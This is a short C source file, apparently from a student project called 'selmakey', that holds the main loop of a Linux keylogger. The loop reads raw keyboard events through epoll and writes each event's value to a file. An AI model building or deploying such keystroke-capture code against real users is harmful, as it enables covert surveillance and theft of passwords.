/*
** listeners.c for listeners in /home/alexmog/projets/SELMA/selmakey/linux/src
** 
** Made by Moghrabi Alexandre
** Login   <alexmog@epitech.net>
** 
** Started on  Thu Jul 17 18:29:45 2014 Moghrabi Alexandre
** Last update Thu Jul 17 18:55:01 2014 Moghrabi Alexandre
*/

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include "selmakey.h"

void	sigint_handler(int sig)
{
  (void)sig;
  exit(0);
}

void	start_keylog(t_kl *kl)
{
  signal(SIGINT, sigint_handler);
  while (1337)
    {
      kl->ret = epoll_wait(kl->epoll_fd, &kl->epoll_event,
			   NB_MAX_EVENTS, -1);
      read(kl->fd, &kl->kbd_event, sizeof(kl->kbd_event));
      fprintf(kl->file, "%d\n", kl->kbd_event.value);
      fflush(kl->file);
    }
  close(kl->epoll_fd);
  close(kl->fd);
  fclose(kl->file);
}
